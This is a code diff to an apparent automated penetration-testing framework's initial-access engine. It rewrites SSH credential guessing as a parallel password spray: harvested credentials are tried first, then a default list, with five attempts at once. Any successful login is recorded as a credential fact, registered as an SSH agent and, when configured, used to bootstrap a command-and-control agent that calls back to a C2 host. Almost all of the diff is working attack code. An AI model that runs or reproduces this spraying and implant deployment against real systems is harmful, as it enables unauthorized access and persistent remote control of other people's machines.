@@ -514,72 +514,94 @@ class InitialAccessEngine:
         ip: str,
         port: int,
     ) -> InitialAccessResult:
-        """Try each entry in ``_DEFAULT_CREDS`` via asyncssh."""
+        """Try credentials via asyncssh with parallel spray (Semaphore=5)."""
         import asyncssh  # deferred import
 
         # Prepend harvested credentials from this operation (highest priority)
         harvested = await self._load_harvested_creds(db, operation_id)
-        # Preserve order: harvested first, then default list (maintaining original order)
         seen_in_harvested = set(harvested)
         ordered_creds = harvested + [c for c in _DEFAULT_CREDS if c not in seen_in_harvested]
 
-        for username, password in ordered_creds:
-            try:
-                logger.debug(
-                    "Trying SSH %s@%s:%s with password %s",
-                    username, ip, port, password,
-                )
-                async with await asyncssh.connect(
-                    ip,
-                    port=port,
-                    username=username,
-                    password=password,
-                    known_hosts=None,
-                ):
-                    # Connection succeeded — record the credential
-                    cred_str = f"{username}:{password}@{ip}:{port}"
-                    await self._write_credential_fact(
-                        db=db,
-                        operation_id=operation_id,
-                        target_id=target_id,
-                        cred_value=cred_str,
-                    )
-                    logger.info(
-                        "SSH login succeeded for %s@%s:%s", username, ip, port
-                    )
+        semaphore = asyncio.Semaphore(5)
+        found_event = asyncio.Event()
+        result_holder: list[InitialAccessResult] = []
 
-                    # Register SSH agent record (enables DirectSSHEngine routing)
-                    await self._register_ssh_agent(
-                        db,
-                        operation_id,
-                        target_id,
-                        ip,
-                        f"{username}:{password}",
+        async def _try_one(username: str, password: str) -> None:
+            if found_event.is_set():
+                return
+            async with semaphore:
+                if found_event.is_set():
+                    return
+                try:
+                    logger.debug(
+                        "Trying SSH %s@%s:%s with password %s",
+                        username, ip, port, password,
                     )
-
-                    # Bootstrap C2 agent only when EXECUTION_ENGINE=c2
-                    if settings.EXECUTION_ENGINE == "c2":
-                        c2_host = (
-                            settings.C2_AGENT_CALLBACK_URL or settings.C2_ENGINE_URL
+                    async with await asyncio.wait_for(
+                        asyncssh.connect(
+                            ip,
+                            port=port,
+                            username=username,
+                            password=password,
+                            known_hosts=None,
+                        ),
+                        timeout=8.0,
+                    ):
+                        # Connection succeeded — record the credential
+                        cred_str = f"{username}:{password}@{ip}:{port}"
+                        await self._write_credential_fact(
+                            db=db,
+                            operation_id=operation_id,
+                            target_id=target_id,
+                            cred_value=cred_str,
                         )
-                        await self.bootstrap_c2_agent(
-                            ip=ip,
-                            credential=(username, password),
-                            c2_host=c2_host,
+                        logger.info(
+                            "SSH login succeeded for %s@%s:%s", username, ip, port
                         )
 
-                    return InitialAccessResult(
-                        success=True,
-                        method="ssh_credential",
-                        credential=f"{username}:{password}",
-                        agent_deployed=False,
-                        error=None,
+                        # Register SSH agent record (enables DirectSSHEngine routing)
+                        await self._register_ssh_agent(
+                            db,
+                            operation_id,
+                            target_id,
+                            ip,
+                            f"{username}:{password}",
+                        )
+
+                        # Bootstrap C2 agent only when EXECUTION_ENGINE=c2
+                        if settings.EXECUTION_ENGINE == "c2":
+                            c2_host = (
+                                settings.C2_AGENT_CALLBACK_URL or settings.C2_ENGINE_URL
+                            )
+                            await self.bootstrap_c2_agent(
+                                ip=ip,
+                                credential=(username, password),
+                                c2_host=c2_host,
+                            )
+
+                        result_holder.append(InitialAccessResult(
+                            success=True,
+                            method="ssh_credential",
+                            credential=f"{username}:{password}",
+                            agent_deployed=False,
+                            error=None,
+                        ))
+                        found_event.set()
+                except (asyncssh.Error, OSError, asyncio.TimeoutError):
+                    logger.debug(
+                        "SSH login failed for %s@%s:%s", username, ip, port
                     )
-            except (asyncssh.Error, OSError):
-                logger.debug(
-                    "SSH login failed for %s@%s:%s", username, ip, port
-                )
-                continue
+
+        tasks = [asyncio.create_task(_try_one(u, p)) for u, p in ordered_creds]
+        await asyncio.wait(tasks)
+
+        # Cancel any stragglers (shouldn't be any after wait, but safety)
+        for t in tasks:
+            if not t.done():
+                t.cancel()
+
+        if result_holder:
+            return result_holder[0]
 
         logger.warning("All SSH credentials failed for %s:%s", ip, port)
         return InitialAccessResult(
@@ -603,7 +625,7 @@ class InitialAccessEngine:
         now = datetime.now(timezone.utc).isoformat()
 
         await db.execute(
-            "INSERT INTO facts "
+            "INSERT OR IGNORE INTO facts "
             "(id, trait, value, category, source_technique_id, "
             "source_target_id, operation_id, score, collected_at) "
             "VALUES (?, ?, ?, ?, NULL, ?, ?, 1, ?)",
@@ -611,6 +633,7 @@ class InitialAccessEngine:
         )
         await db.commit()
 
+        # Broadcast unconditionally — DB-level UNIQUE index handles dedup
         fact_payload = {
             "id": fact_id,
             "trait": trait,
